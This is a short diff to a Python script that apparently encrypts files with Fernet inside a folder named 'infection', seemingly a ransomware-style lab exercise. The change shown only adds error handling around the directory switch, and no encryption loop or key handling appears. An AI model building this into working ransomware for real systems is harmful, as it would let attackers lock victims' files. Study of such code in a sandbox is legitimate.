@@ -20,7 +20,11 @@ if not extensions:
     exit(1)
 fernet = Fernet(key)
 silent = False
-os.chdir("/home/ayagmur/infection")
+try:
+    os.chdir("/home/ayagmur/infection")
+except FileNotFoundError:
+    print("No folder infection")
+    exit(1)
 
 
 def encrypt(file):
